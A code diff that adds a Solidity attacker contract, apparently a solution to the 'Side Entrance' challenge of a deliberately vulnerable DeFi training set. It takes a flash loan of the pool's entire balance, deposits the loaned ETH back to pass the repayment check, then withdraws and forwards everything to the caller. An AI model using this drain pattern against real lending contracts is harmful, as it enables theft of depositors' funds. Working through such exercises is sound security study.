@@ -45,3 +45,22 @@ contract SideEntranceLenderPool {
             revert RepayFailed();
     }
 }
+
+contract SideEntranceLenderPoolAttacker is IFlashLoanEtherReceiver{
+    SideEntranceLenderPool sideEntranceLenderPool;
+    constructor(address _sideEntranceLenderPool){
+        sideEntranceLenderPool = SideEntranceLenderPool(_sideEntranceLenderPool);
+    }
+
+    function attack() external {
+        sideEntranceLenderPool.flashLoan(address(sideEntranceLenderPool).balance);
+        sideEntranceLenderPool.withdraw();
+        SafeTransferLib.safeTransferETH(payable(msg.sender), address(this).balance);
+    }
+ 
+    receive() external payable {}
+
+    function execute() external payable{
+        sideEntranceLenderPool.deposit{value: address(this).balance}();
+    }
+}
